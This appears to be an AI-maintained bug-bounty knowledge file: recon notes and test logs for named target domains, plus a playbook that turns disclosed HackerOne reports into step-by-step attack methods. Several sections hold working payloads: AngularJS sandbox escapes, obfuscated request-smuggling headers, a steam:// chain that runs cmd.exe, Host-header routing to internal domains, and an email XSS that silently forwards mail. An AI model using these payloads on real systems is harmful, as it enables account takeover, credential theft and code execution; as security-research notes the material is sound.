*Source: `/root/Myskill/domains/hub.devolutions.com/findings/F-01-opensearch-credential-disclosure.md`*

## [Bugbountyskills.md] >> [domains/hub.devolutions.com/findings/F-02-sourcemap-exposure.md] F-02-sourcemap-exposure.md

*Source: `/root/Myskill/domains/hub.devolutions.com/findings/F-02-sourcemap-exposure.md`*

## [Bugbountyskills.md] >> [domains/hub.devolutions.com/findings/REPORT-F-01-server-configurations-credential-disclosure.md] REPORT-F-01-server-configurations-credential-disclosure.md

*Source: `/root/Myskill/domains/hub.devolutions.com/findings/REPORT-F-01-server-configurations-credential-disclosure.md`*

## [Bugbountyskills.md] >> [domains/jardindacclimatation.fr/SKILL.md] SKILL.md

*Source: `/root/Myskill/domains/jardindacclimatation.fr/SKILL.md`*

### [Bugbountyskills.md] Subdomains & hosts

| Host | Purpose | Stack | Notes |
|---|---|---|---|
| `www.jardindacclimatation.fr` | main site | Akamai → GCP → Next.js | **in scope** |
| `jardindacclimatation.fr` (apex) | bare nginx @185.16.44.89 | nginx | 404 on `/`; cert mismatch; not the app |
| `api.` / `api-ticket.` / `int-api.` / `pp-api.` | ticketing APIs | unknown | **scope unconfirmed — passive only** |
| `pp-api-ticket-v9/v10/v11.` | versioned ticket APIs | unknown | versioned = old code likely; **scope unconfirmed** |
| `preprod.` / `int.` / `pp.` / `prod.` | staging/prod splits | unknown | **scope unconfirmed — do not test** |
| `gtm-origin(.gcp).` / `gtm-preview(.origin.gcp).` | GTM servers | GCP | **scope unconfirmed** |
| `octime.` / `www.octime.` | OCTime ticketing | unknown | **scope unconfirmed** |
| `info.` / `mail.` / `tr.communication.` | infra/mail | unknown | **scope unconfirmed** |

## [Bugbountyskills.md] >> [domains/jardindacclimatation.fr/evidence/technique-matrix.md] technique-matrix.md

*Source: `/root/Myskill/domains/jardindacclimatation.fr/evidence/technique-matrix.md`*

## [Bugbountyskills.md] XSS (`xss-testing`)

| Endpoint / context | Param | Vector | Status |
|---|---|---|---|
| `GET /[uid]` catch-all | path segment | path-based reflection into SSR HTML | Untested |
| `GET /attractions/[uid]`, `/restaurants/[uid]` | path segment | same | Untested |
| `GET /` and all pages | `?q=`, `?search=`, `?utm_*` | reflected query | Untested (canary probe queued) |
| `GET /checkout/result` | `code`, `guest`, `language` | reflected into checkout page (rich context: JSON/JS) | Untested — **high value, money flow page** |
| `GET /auth/callback` | `code`, `state`, `error` | OAuth callback, often echoed | Untested — 200/8KB shell |
| `GET /entreprises-et-cse/verification-email` | `token`/`email` | echoed into verification UI | Untested |
| `POST /api/proxy/smtp/contactForm` | `customer_form.firstName/lastName/subject/message` | **stored XSS** if staff view the ticket | Untested (single test max — sends mail) |
| `dangerouslySetInnerHTML` ×32 | — | Prismic CMS `custom_html`, `oembed.html`, i18n | **Ruled out as unauth** — CMS-author-controlled only |

Sinks found: 9 `location.href=`, 7 `innerHTML=`, 5 `location.assign`, 1 `eval(` — all inside
Adyen/React/vendor bundles, no app-level user-reachable sink identified in static analysis.

## [Bugbountyskills.md] >> [domains/jardindacclimatation.fr/findings/001-email-enumeration-oracle.md] 001-email-enumeration-oracle.md

*Source: `/root/Myskill/domains/jardindacclimatation.fr/findings/001-email-enumeration-oracle.md`*

## [Bugbountyskills.md] >> [domains/quizlet.com/SKILL.md] SKILL.md

*Source: `/root/Myskill/domains/quizlet.com/SKILL.md`*

### [Bugbountyskills.md] Subdomains & hosts

Reachability verified with one `GET /` per host (full matrix: `evidence/reachability-matrix.txt`).

| Host | Purpose | Stack | Reachable from this IP? |
|---|---|---|---|
| `quizlet.com` (apex) | main app / marketing | Next.js + Rails front controller, GCP LB | **only `/.well-known/*`** — everything else challenged |
| `www.quizlet.com` | main site | same | ❌ challenge (all paths, GET+POST) |
| `api.quizlet.com` | REST 3.0 (in scope), 2.0 (out) | unknown | ❌ challenge |
| `assets.quizlet.com` | static (`_next/static`, fonts, `ads-frontend-v2.min.js`) | Cloudflare cache | ❌ challenge |
| `study.quizlet.com` | unidentified Rails service (API-shaped) | Rails, Google LB, 500/min | ✅ pass-through |
| `el.quizlet.com` | event logger publisher (`eventlogger-publisher-frontend`) | Envoy → k8s → Flask | ✅ pass-through (⚠ `/status` hard-blocked) |
| `jg7y.quizlet.com` | Snowplow collector | Snowplow + GCP LB | ✅ pass-through |
| `ablink.{account,learn,lifecycle,newsletter,promotions,subscriptions}.quizlet.com` | email click-tracking (retired) | bare nginx | ✅ pass-through — default 404, **no app** |
| `dev.quizlet.com` | dev environment (own cert `*.dev.quizlet.com`) | — | ❌ no public DNS |
| `mp.quizlet.com`, `fake.mp.quizlet.com` | in cert SANs (purpose unknown) | — | ❌ challenge |
| `learn.quizlet.com`, `admin`, `cp`, `docker`, `elastic`, `stage`, `staging`, `graphql`, `sso`, `blog`, `builder`, `demo`, `app`, `ads`, `cdn`, `crm`, `download`, `el2` … | names from passive DNS/CT | all proxied | ❌ challenge |
| `mail.quizlet.com` | CNAME → `mail.google.com` | Google | not web |
| `help.*`, `get.*` | **OUT OF SCOPE** (Zendesk / AppsFlyer `customlinks.appsflyer.com`) | — | 302 / 200 — fingerprinted only |

⚠ **Wildcard DNS:** `*.quizlet.com` → `104.16.133.27/104.16.134.27` for *any* name (verified with gibberish controls). Subdomain brute force is therefore useless — every name "resolves". Use CT (`certspotter`) for real cert SANs: `*.quizlet.com`, `*.dev.quizlet.com`, `ablink.*`, `abmail.*`, `dev`, `mp`, `fake.mp`, `study`, `get`, `help`.

## [Bugbountyskills.md] >> [domains/quizlet.com/findings/F-01-missing-security-headers-origin.md] F-01-missing-security-headers-origin.md

*Source: `/root/Myskill/domains/quizlet.com/findings/F-01-missing-security-headers-origin.md`*

## [Bugbountyskills.md] >> [domains/quizlet.com/findings/F-02-envoy-k8s-service-disclosure.md] F-02-envoy-k8s-service-disclosure.md

*Source: `/root/Myskill/domains/quizlet.com/findings/F-02-envoy-k8s-service-disclosure.md`*

## [Bugbountyskills.md] >> [domains/quizlet.com/findings/F-03-internal-routing-header-disclosure.md] F-03-internal-routing-header-disclosure.md

*Source: `/root/Myskill/domains/quizlet.com/findings/F-03-internal-routing-header-disclosure.md`*

## [Bugbountyskills.md] >> [domains/reready.co/SKILL.md] SKILL.md

*Source: `/root/Myskill/domains/reready.co/SKILL.md`*

### [Bugbountyskills.md] Subdomains & hosts

| Host | Purpose | Stack | Notes |
|---|---|---|---|
| `sandbox.reready.co` | **authorized test env** | nginx + Rails | 165.227.99.141 |
| `www.reready.co` | production | nginx + Rails (same app) | 165.227.223.207 — **out of scope for active testing** |
| `reready.co` | apex → prod | — | resolves to prod IP range |

## [Bugbountyskills.md] >> [domains/reready.co/evidence/2026-10-25-unauth.md] 2026-10-25-unauth.md

*Source: `/root/Myskill/domains/reready.co/evidence/2026-10-25-unauth.md`*

## [Bugbountyskills.md] 2. Reflection / RXSS sweep

90 probes: 6 pages × 15 params (`q,search,name,email,redirect_to,return_to,url,utm_source,
callback,demo,page,id,filter,sort,keyword`), marker `rXsS7f3a"'<>MARK`.
```
tested=90 reflected=0
```
Only reflection found anywhere = `/help?search=`:
```
GET /help?search=rXsS7f3a%22%27%3C%3EMARK   -> 200, 10378 B
  occurrence 1 (attribute): value="rXsS7f3a&quot;&#39;&lt;&gt;MARK" type="text" name="search"
  occurrence 2 (body text):  0 search results for "rXsS7f3a&quot;&#39;&lt;&gt;MARK"
```
=> both contexts fully `html_escape`d; `"` `&quot;`, `'` `&#39;`, `<` `&lt;`, `>` `&gt;`.
No unencoded occurrence, no attribute break-out, no `javascript:` context.

## [Bugbountyskills.md] >> [domains/verizon.com/SKILL.md] SKILL.md

*Source: `/root/Myskill/domains/verizon.com/SKILL.md`*

### [Bugbountyskills.md] Subdomains & hosts

Populated by the passive/active recon pass. See `recon/` for raw output.

## [Bugbountyskills.md] >> [domains/vinted.com/SKILL.md] SKILL.md

*Source: `/root/Myskill/domains/vinted.com/SKILL.md`*

## [Bugbountyskills.md] >> [domains/vinted.com/findings/F-01-missing-security-headers.md] F-01-missing-security-headers.md

*Source: `/root/Myskill/domains/vinted.com/findings/F-01-missing-security-headers.md`*

## [Bugbountyskills.md] >> [domains/vinted.com/findings/F-02-static-csrf-token-origin-unchecked.md] F-02-static-csrf-token-origin-unchecked.md

*Source: `/root/Myskill/domains/vinted.com/findings/F-02-static-csrf-token-origin-unchecked.md`*

### [Bugbountyskills.md] 17.6 Unescaped dot in the redirect allowlist regex → open redirect → cross-domain auth-token theft → 1-click ATO

SOURCE: HackerOne #3723458 — Khan Academy, "1-Click Account Takeover via Open Redirect through Regex Bypass in Domain Validation" (CVSS 9.6, Critical, disclosed 2026-06-20)  read 2026-11-07
CLASS: open redirect (regex/confinement bypass) → token theft → account takeover (CWE-601 → CWE-522)
CORE METHOD:
  1. Find a login/SSO parameter that takes a post-auth destination: `?continue=`, `?next=`, `?redirect_uri=`, `?return_to=`, `?RelayState=`. Observe that cross-subdomain destinations trigger a one-time "auth transfer token" appended to the redirect URL.
  2. Recover the validation regex — source maps are the fastest route. In the report it was `KA_DOMAIN_REGEX = /(^|\.)(khanacademy\.(org|dev|test|local)|kastatic\.org|.*-6fmjyrz2lq-uc.a.run.app)$/` — the dots between `uc`,`a`,`run`,`app` are NOT escaped, so any character matches them.
  3. Register a domain that matches the unescaped pattern: intended `*-6fmjyrz2lq-uc.a.run.app` → attacker registers `xfarr-6fmjyrz2lq-uc-a-run.app` (hyphens match the unescaped dots); the TLD `.app` also matches `a.run.app`.
  4. Deliver `https://classroom.khanacademy.org/login?continue=https%3A%2F%2Fxfarr-6fmjyrz2lq-uc-a-run.app%2F`; the logged-in victim is redirected to the attacker host at `.../transfer_auth?key=<TOKEN>` — the token is NOT consumed because the consuming JS never runs on the attacker origin.
  5. Replay the captured `key` on a legitimate `*.khanacademy.org` domain → backend `Set-Cookie` (`KAAS/KAAL/KAAC`) → full session as the victim.
DETECTION SIGNAL: post-login `continue`/`next` param that mints a cross-domain auth token into the redirect URL; a client- or server-side regex allowlist for the destination; unescaped `.` or missing `^…$` anchors in it; production `*.js.map` files served.
CHAIN: unescaped-dot regex → attacker registers a matching lookalike domain → open redirect → one-time auth-transfer token leaked in the URL (never consumed off-origin) → replay on a legit domain → full session cookies → 1-click ATO of any user (student/teacher/admin).
TRANSFERABLE TEST: Render a redirect allowlist as a regex and try to match a domain you can register: replace every unescaped `.` with `-` or another char, drop anchors, and abuse prefix/suffix wildcards (`.*-svc-uc.a.run.app`). Prove with a controlled domain and one full token-capture→replay cycle before reporting.

<!-- exact-duplicate entries folded in: 1 -->

### [Bugbountyskills.md] 17.20 HTTP desync / request smuggling (TE-header obfuscated) -> web-cache poisoning -> stored XSS on a login page (PayPal #510152, bypass of #488147)

SOURCE: https://hackerone.com/reports/510152  2026-11-07
ROUTE: report page rendered via web_extract; the full method is in the credited writeup (albinowax) — "HTTP Desync Attacks: Request Smuggling Reborn", portswigger.net/research/http-desync-attacks-request-smuggling-reborn, §PayPal — cited by the report itself.
CLASS: HTTP request smuggling / desync → web-cache poisoning → stored XSS on a login page, incl. bypass of the naive fix (CWE-444 → CWE-79)
CORE METHOD:
  1. Detect desync per endpoint (CL.TE / TE.CL): send a `Content-Length`-mismatched request carrying a `Transfer-Encoding` header OBFUSCATED so the FRONT-END does not recognise it but the BACK-END does, followed by a victim request, then watch for the victim request being answered by the previous request's response. Header-obfuscation variants that hide TE from one server: `Transfer-Encoding: xchunked`, `Transfer-Encoding : chunked`, `Transfer-Encoding:[tab]chunked`, a line-wrapped `Transfer-Encoding:\r\n\tchunked`, `X: X[\n]Transfer-Encoding: chunked`, duplicate/padded TE headers.
  2. Confirm (prove socket poisoning) without harming users: smuggle a request for a harmless unique path (`GET /404`) so the NEXT real request completes it; a `404`/unique body in the victim response proves the desync ("Detect-Confirm-Explore-Store/Attack" methodology).
  3. Exploit through the CACHE: where a web cache sits in front, issue the attack + victim requests YOURSELF and let the HARMFUL response be cached under a URL other users request. PayPal: desync so the cached response for `https://c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js` (a JS file loaded by the sign-in page) becomes attacker-controlled → persistent JS hijack on paypal.com/signin.
  4. Get past CSP: the c.paypal.com sub-page (rendered in a dynamically generated iframe on the login page) had NO CSP; a second CSP-less page at `paypal.com/us/gifts` ALSO imported the poisoned JS → redirect the c.paypal.com iframe to that page → run JS for a third time in a CSP-less origin that can reach the parent DOM → read the plaintext password the victim types into the login page (Safari/IE where the redirect/HSTS behaviour permits).
  5. Bypass the FIX (this report is the bypass of #488147): PayPal had patched #488147 by configuring Akamai to REJECT any request containing `Transfer-Encoding: chunked`; a line-wrapped header `Transfer-Encoding:\r\n\tchunked` is still parsed as chunked by the back-end but no longer matches the front-end's naive reject rule → the desync (and the login-page stored XSS) worked AGAIN.
DETECTION SIGNAL: a front-end (CDN/reverse proxy) + back-end chain that disagree on request framing; a web cache in the path; a security control implemented as a substring/regex match on header strings (reject-if-contains "Transfer-Encoding: chunked") instead of correct parsing; login/checkout pages importing a third-party JS file from a separately-cached origin, with a CSP-less sibling page importing the same file.
CHAIN: CL.TE desync (TE header obfuscated to evade the front-end's reject rule) → socket/request poisoning → a harmful redirect/response stored by the web cache under a JS/login URL → attacker JS executes on paypal.com/signin → CSP-less page chain (c.paypal.com iframe → /us/gifts) → parent-DOM read → plaintext PayPal credential theft (High 8.7, $20,000; predecessor #488147 $18,900).
TRANSFERABLE TEST: For every host send `POST /` with `Content-Length: 4` + `Transfer-Encoding: chunked` smuggling `GET /404 HTTP/1.1\r\nX: x`, then a victim request; a unique/`404` body in the victim response = desync. When a proxy "fixes" smuggling by string-matching the TE header, retry with `Transfer-Encoding:\r\n\tchunked`, mixed case, and duplicate/whitespace-padded headers. Prioritise endpoints feeding a cache, and check whether any cached JS is imported by a login/checkout page (or a CSP-less sibling) — that is where the cache-poison becomes stored XSS.

### [Bugbountyskills.md] 17.27 Name field → secondary render path (slash-command / quick-action picker) → stored XSS for another user (GitLab Customer Relations)

SOURCE: https://hackerone.com/reports/1578400 — GitLab `/add_contacts` `/remove_contacts` (High, CVSS 8.7, $13,950, CVE-2022-1948)  read 2026-11-07
CLASS: stored XSS via an unaudited secondary render path of an attacker-settable object name
CORE METHOD:
  1. Pick a recently shipped feature with a per-group CRUD object (15.0 "Customer Relations", enabled in group Settings → Permissions and group features).
  2. Store `<script>alert(document.domain)</script>` in BOTH First name and Last name via the normal create form.
  3. Reach a different surface that renders those names: project → Issues → New issue → type `/add_contacts` in the description → the picker inserts the unescaped name → script fires.
  4. The object's own list page escaped correctly; only the picker didn't — every render path must be tested separately.
DETECTION SIGNAL: attacker-settable name/title shown in autocomplete/mention/slash-command/search widgets that build DOM from strings (`innerHTML`, `$('<li>'+name+'</li>')`); new "/" quick actions in release notes; length-limited but not char-filtered Name fields.
CHAIN: any member able to create/rename a shared-namespace object → unescaped name in another user's picker → script as victim → session/CSRF-token theft ($13,950).
TRANSFERABLE TEST: Name every object you can create with `<script>alert(document.domain)</script>` and enumerate every surface it renders on for other users (pickers, @-mention, sidebars, search previews, exports, mails, second session); grep bundles for `innerHTML`/`.html(`/`document.write`/`new Option(`/`+ name +`.

### [Bugbountyskills.md] 17.58 Webview/desktop chat XSS → CUSTOM URI-SCHEME HANDLER (`steam://openexternalforpid/<n>/<program>`) → arbitrary local program execution → RCE (Valve Steam chat #409850)

SOURCE: https://hackerone.com/reports/409850 — Valve, "XSS in steam react chat client" (Cross-site Scripting - Stored; Critical 9.3; reporter zemnmez; asset steamcommunity.com)  read 2026-11-07 (short public body, 810 bytes; the full method is the reporter's writeup published as the report's TEAM SUMMARY, summary id 13195, author zemnmez, 24,033 bytes, via the HackerOne `.json` endpoint)
CLASS: stored XSS in a webview/Electron desktop client escalated through privileged custom URI-scheme handlers to local program execution · CWE-79 → CWE-94
CORE METHOD:
  1. Recon: the desktop client runs the SAME React app as the web client (steamcommunity.com/chat) → DevTools on the web app sees the desktop code. Content renders as a BBCode subset over a binary WebSocket. Grep bundles for `dangerously`/`innerHTML`/`OEMBED`, breakpoint them, walk the call stack to the sanitizer and the BBCode→component table.
  2. Entry point: `[url=...]` is passed to an `<a href>` and React does NOT sanitise attribute values → `[url=javascript:...]` is a persistent XSS. Enumerate which tags survive the server's stripping (`[url=]`, `[code]`, `[image]` did). The desktop client's locked-down Chromium strips `javascript:` → pivot instead of stopping.
  3. Second entry point: rich embeds/oEmbed — the provider (Embedly) trusts iframe sandboxing + a host WHITELIST, and `codepen.io` (attacker-authored JS) is whitelisted; in an Electron-style host a sandboxed iframe can still reach privileged APIs via its `window` unless it is a real `<webview>`.
  4. Escalation A: a custom scheme runs in the desktop client WITHOUT the confirmation a browser shows. Bin-grep the client's strings for `scheme://` to find UNDOCUMENTED handlers — here `steam://openexternalforpid/%s/%s`.
  5. Escalation B: Windows filetype associations ARE protocol handlers (`HKEY_CLASSES_ROOT`, syntax `prog $0`), so `jarfile:c:/x.jar` invokes `<java> jarfile:c:/x.jar` with a bogus `jarfile:c:` prefix; **directory traversal neutralises the prefix** — `jarfile:..\..\..\..\..\Users\me\Downloads\drive-by.jar` runs a local jar.
  6. Final link: with the client console open (`steam://console`) a `jarfile:` link made the Web Helper internally issue `steam://openexternalforpid/10400/jarfile: something` — revealing the privileged wrapper form `openexternalforpid/<magic number>/<program> <args>`; `steam://openexternalforpid/10400/cmd.exe …` executed an arbitrary program from chat content → RCE.
DETECTION SIGNAL: a desktop/webview client (Electron, CEF, WebView2, custom Chromium) rendering user content (chat, markdown, BBCode, embeds) where (a) an attribute sink accepts `javascript:`/custom-scheme URIs, (b) privileged URI handlers exist whose OS confirmation is bypassed in-app, (c) internal WRAPPER handlers of the shape `<scheme>://<verb>/<arg>/<program> <rest>` exist (find by bin-grepping the client), and (d) a whitelisted embed host serves user JS (codepen/jsfiddle) or an in-app debug console echoes the internal invocations.
CHAIN: stored XSS in the chat renderer (`[url=javascript:…]` or whitelisted-oEmbed JS) → attacker URL inside a privileged desktop context → enumerate `scheme://` handlers by bin-grep → discover the undocumented two-argument wrapper from the client's own console → prefix-neutralisation on generic handlers (`jarfile:` + `..\`) → arbitrary local program execution → RCE (Critical 9.3).
TRANSFERABLE TEST: push `<a href="javascript:alert(1)">` (and `[url=javascript:…]`, `[link](javascript:…)`) through EVERY user-content sink; if stripped, switch to the app's own scheme (`<a href="steam://…">`-style renders without OS confirmation), enumerate handlers (bin-grep the binary/asar for `://`, or list `HKEY_CLASSES_ROOT` on Windows), then try `<scheme>://<verb>/<number>/cmd.exe` and prepend `..\..\` to any handler argument that interpolates `$0`. A handler reachable from rendered content that takes a program plus args is RCE; a whitelisted oEmbed host serving user JS is the other door.

### [Bugbountyskills.md] 17.61 Exposed proxy/gateway on a non-standard port routes on an attacker-supplied `Host:` header → internal-only domains reachable (Reddit #2967634)

SOURCE: https://hackerone.com/reports/2967634 — Reddit, "Exposed proxy allows to access internal reddit domains" (Improper Access Control - Generic; High, team-rated; reporter la_revoltage)  read 2026-11-07 (full body, 546 bytes, via the HackerOne `.json` endpoint)
CLASS: internet-exposed proxy/routing service that honours an untrusted `Host` header → routing into internal domains · CWE-441 / CWE-306
CORE METHOD:
  1. Harvest internal hostnames with no traffic to the target: CT logs (`search.censys.io/search?resource=certificates&q=<internal-domain>` — the report's `snoo.dev` is Reddit's employee domain) and source search (`github.com/search?q=org%3A<org>%20<internal-domain>&type=code`).
  2. Find an org-owned IP answering HTTP(S) on a NON-standard port with a proxy/gateway/admin banner (`https://52.90.28.77:30920`, self-signed cert → `--insecure`).
  3. One request: `curl --insecure https://52.90.28.77:30920/reddit --header "Host: <internal-domain>"`. The service routes on the Host it is handed and accepts any value; the `/<path>` prefix does not stop it.
  4. Reported impact verbatim: "Attacker can access internal domains."
DETECTION SIGNAL: org-owned IP with HTTP(S) on `:8080/:8090/:30920/:8443/:9200/:5601/:2375` that looks like a proxy/router/gateway/dev-tunnel/admin panel; responses that change with a spoofed `Host` (banner/redirect/body, or `200` for a non-public hostname); internal hostnames in CT logs or Git history; access control that is merely "know the Host".
CHAIN: CT/GitHub recon yields an internal name → exposed proxy on a company IP → `Host: <internal-name>` → request routed inside the perimeter unauthenticated → internal service access (High) → internal admin/app endpoint = entry primitive for RCE/ATO escalation.
TRANSFERABLE TEST: for each org-owned IP/port in scope, re-send a known-good request with `Host: <internal-name>` harvested from CT logs (`search.censys.io` certificate search) or `github.com/search?q=org%3A<org>&type=code` (also `Host: <internal-name>:80`, and an absolute-URI line `GET http://<internal-name>/ HTTP/1.1`). A status/banner/body difference versus a bogus control Host = attacker-controlled internal routing; then walk `/<path>` prefixes and internal admin paths.

### [Bugbountyskills.md] 17.63 Docs/help portal on a third-party SaaS renders user "suggest edits" as an AngularJS template → CSTI executes in the admin dashboard → brand-wide stored XSS / developer-account hijack (Uber developer.uber.com / readme.io #131450)

SOURCE: https://hackerone.com/reports/131450 — Uber, "Stored XSS in developer.uber.com" (XSS - Generic; no published rating, 2016; reporter albinowax / James Kettle)  read 2026-11-07 (full body, 2,597 bytes, via the HackerOne `.json` endpoint)
CLASS: stored XSS via client-side template injection in a third-party docs platform hosted on the brand domain, triggered inside a privileged viewer's session · CWE-79 → CWE-94
CORE METHOD:
  1. Detect that `developer.uber.com` is served by `uber.readme.io` (third-party docs SaaS), and that self-registration is open.
  2. Get an authenticated app session without a browser UI: load any docs page for a `connect.sid`, then `POST /users/session` (`Content-Type: application/json;charset=utf-8`, cookie `connect.sid`, body `{"email":"…","password":"…","action":"session"}`) → new `connect.sid` that opens `/docs/<page>/edit` ("Suggest edits").
  3. Store the CSTI payload as the suggested-edit body:
     `{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}`
  4. It renders in the readme.io ADMIN dashboard when the admin opens the suggestion — and can auto-approve itself, so it self-persists.
  5. Runs in the origin serving `developer.uber.com` → "potentially hijacking the account of every developer who views it". Fix tell: `ng-nonbindable`, or separate domain for the docs host.
DETECTION SIGNAL: docs/help/KB/CMS subdomain under the brand that is really a third-party SaaS (readme.io, GitBook, Zendesk/Intercom articles, preview servers) rendering user-submitted fields with a client-side template engine (`ng-app`/`{{ }}`, Vue, Handlebars) into a staff/admin dashboard; an unprivileged author → privileged reader pair (suggest edit, comment, feedback, ticket); open signup on the docs host.
CHAIN: third-party docs app on the brand domain → stored `{{…}}` in "suggest edits" → executes in the admin/reviewer dashboard → self-approve/persist + session exfiltration + hijack of every developer opening the docs (stored XSS with session impact).
TRANSFERABLE TEST: on any docs/help portal under the brand, submit `{{7*7}}` as the edit body — a rendered `49` proves interpolation; escalate with `{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(document.domain)")()}}` (AngularJS sandbox escape), and without `ng-app` with `{{constructor.constructor('alert(1)')()}}` / `{{$on.constructor('alert(1)')()}}`; then check what the privileged viewer's session is worth.

### [Bugbountyskills.md] 17.84 Inbound-EMAIL stored XSS: the mail client's CSS rewriter DECODES octal escapes (`\00003c`) inside `url()` and re-inserts the "filtered CSS" as HTML, the DOM shadow root is escaped with encoded OPENING tags, and the injected markup is armed by re-using the app's OWN JS-framework attribute (`data-controller`) so the framework auto-submits the form with the CSRF token (Basecamp HEY.com #982291)

SOURCE: https://hackerone.com/reports/982291 — Basecamp / HEY.com, "HEY.com email stored XSS" (Cross-site Scripting - Stored; reporter jouko / Jouko Pynnönen; triaged High $1,500 then raised by the vendor to CRITICAL +$3,500 = $5,000, fixed in <24 h; disclosed 2020-10-27)  read 2026-11-07 (full body 2,415 B from the local disclosed-reports dataset + the whole live page incl. the three follow-up payload comments and the vendor's root-cause comment, via `r.jina.ai`)
CLASS: stored XSS via a mail renderer's CSS-escape/HTML-serialisation confusion + shadow-root escape + framework-attribute arming · CWE-79
CORE METHOD:
  1. `sendmail -t < email.txt` a `Content-type: text/html` message to the victim; viewing the message is the entire trigger.
  2. Body = a `<style>` block whose `url()` argument is octal-escaped HTML: `url(cid://\00003c\000027message-content\00003e\00003ctemplate\00003e\00003cstyle\00003exxx);` and a second `url()` carrying the real payload (`\00003c`=`<`, `\00003e`=`>`, `\000027`=`'`, `\000022`=`"`, `\000020`=space).
  3. Mechanisms: the app REWRITES CSS (`url(...)` proxying) and DECODES the escapes, then inserts the result as HTML — vendor's own words: "we were inserting filtered CSS as HTML rather than text"; the first `\000027` CONFUSES the HTML filter; the message renders inside a DOM SHADOW ROOT so the filter rejects bare closing tags -> carry encoded OPENING tags (`<message-content><template>`) to break out.
  4. Injected, auto-executing markup: `<form action="/my/accounts/<acct_id>/forwardings/outbound" data-controller="beacon"><input type=text name="contact_outbound_forwarding[to_email_address]" value="attacker@x"></form>` — `data-controller="beacon"` hands the form to the app's EXISTING Stimulus controller, which auto-submits it and injects the CSRF token -> silent email-forwarding rule (`acct_id` guesstimable/brute-forceable).
  5. Same bypass, other arms: full-window `<iframe src="//attacker/hey-login.html" style="z-index:9999999;position:fixed;left:0;right:0;top:0;bottom:0">` + `<style>.page-toolbar__item{display:none}</style>` (view spoofing -> credential phishing); a CSP-ALLOWED widget to run code — `<script src="//hcaptcha.com/1/api.js"></script><div class="h-captcha" data-sitekey="key1" data-endpoint="//attacker/hcaptcha.cgi" data-error-callback="alert"></div>`, where your endpoint's error message is handed to `data-error-callback`, calling any single-argument `window` method; or point the form `action` at an attacker URL to exfiltrate the CSRF token.
DETECTION SIGNAL: a mail/chat/comment renderer that REWRITES CSS (proxies `url()`, inlines styles) — that pass is where escapes get decoded and re-inserted; a sanitizer whose ordering vs CSS-escape decoding is wrong; content rendered inside a shadow root/`<template>` (send encoded OPENING tags before any closing tag); attacker markup that survives WITH framework attributes (`data-controller=`, `data-action=`, `hx-post=`, `x-data=`) — any element the page's own JS framework claims becomes an action primitive with the app's CSRF token; a CSP that whitelists a broad third-party CDN and a widget whose callback attribute takes a FUNCTION NAME.
CHAIN: attacker emails HTML -> victim views it -> CSS-`url()` octal-escape bypass defeats the sanitizer and escapes the shadow root -> injected `<form data-controller="beacon">` is claimed by the app's own Stimulus controller and auto-submitted with the app's CSRF token -> mail-forwarding rule created -> every future message (reset links, 2FA codes, invoices) copied to the attacker = ATO (vendor: Critical — "could have been used to take over staff accounts and access sensitive admin tools").
TRANSFERABLE TEST: post raw HTML into any webmail/messaging/comment surface whose body is a `<style>` block containing `url(cid://\00003c\000027x\00003e\00003c/style\00003e…);` built from octal escapes; if decoded tags become DOM nodes the rewriter is bypassed — then make it impactful WITHOUT `<script>`: attach the app's own framework attribute to a state-changing form (`data-controller=`, `data-action=`, `hx-post=`) for CSRF-token-carrying auto-submit, or use a CSP-allowed widget whose callback takes a function name with `data-endpoint` pointed at your server, or a full-window iframe + hiding `<style>` for phishing.

NOTE — read pass 2026-11-07 (batch 18; §17.82–17.84 appended from 6 sources read; #496937 is `no-content` with no readable body — NOT invented). Bodies: #1439026, #365271, #1962645, #982291, #786044 from the LOCAL disclosed-reports dataset mirrors (`/tmp/h1_train|val|test.parquet`, read with `/usr/bin/python3.12` — the default `python3` is 3.14 and has no pyarrow) and re-checked against the live page via `web_extract` / `r.jina.ai`. #496937 (Grammarly, "Employee's GitHub Token Found In Travis CI Build Logs", Information Disclosure, High, $5,000) is `visibility: no-content` (`vulnerability_information` 0 bytes; the `ajaysenr/HackerOne-Disclosed-Reports` mirror prints "No vulnerability information available."; only the team summary is public) -> class + entry point alone is below the entry bar -> no entry, NOT invented. §17.82 is a NEW general method (the privacy toggle is enforced on one client path while a DIFFERENT server flow — the mobile onboarding duplication/exists-check — returns the identifier) — distinct from the §17.28 GraphQL-email, §17.72 deep-link and BAC/IDOR material. §17.83 is a NEW sink (a `javascript:` SCHEME in a redirect parameter, exploited at the CLIENT-SIDE post-auth navigation — the existing chat `javascript:` material is the desktop Steam URI-scheme entry in §17.58, a different sink). §17.84 is a NEW chain (CSS-escape/HTML re-serialisation confusion in a mail renderer + shadow-root escape with encoded opening tags + arming injected markup with the app's own framework attribute) — the mXSS/DOMPurify-differential playbook in §1 does not cover the CSS-`url()` decode-and-re-insert path nor the email entry point. #365271 (Basecamp upload -> ImageMagick/Ghostscript CVE-2017-8291 via `%!`-magic EPS renamed `.gif`) and #786044 (Mail.ru numeric-position derived-table `sleep()` blind SQLi) are recorded in the harvest ledger `/root/bugbountyhuntingskills.md` and the dated knowledge file but got NO §17 slot — the general methods (upload converter + delegate table; time-based blind SQLi) are already recorded.

### [Bugbountyskills.md] 17.96 An XML DTD ENTITY inside an uploaded SVG switches OFF the SVG element/attribute whitelist -> `onload` survives on the root element -> stored XSS that fires in the partner dashboard and in every authorizing merchant's `/admin` (Shopify sales-channel icon #232174)

SOURCE: https://hackerone.com/reports/232174 — Shopify, "XSS on $shop$.myshopify.com/admin/ and partners.shopify.com via whitelist bypass in SVG icon for sales channel applications" (Stored XSS; $5,000.00; reporter bored-engineer; disclosed 2017-06-27)  read 2026-11-07 (route: full researcher body, 2,807 B, `visibility: full`, from the local disclosed-reports dataset mirror `/tmp/h1_train.parquet` — the live page is Cloudflare-blocked on every route from this egress: web_extract SPA shell, browser interstitial, r.jina.ai, translate.goog, proxy mirrors, Wayback JS-shell-only; bounty/metadata independently verified via HackerOne's anonymous GraphQL `POST /graphql` `{report(id:232174){total_award bounties{nodes{amount}}}}` -> `$5,000.00`)
CLASS: stored XSS via sanitizer-whitelist bypass (parser-level DOCUMENT construct) — a developer-supplied SVG branding asset rendered inside privileged admin origins
CORE METHOD:
  1. Target an asset slot whose content is checked against an SVG ELEMENT+ATTRIBUTE WHITELIST (Shopify: the 16x16 "Navigation icon" of a Sales Channel app, checked against the design-guidelines allowed-elements/attributes list).
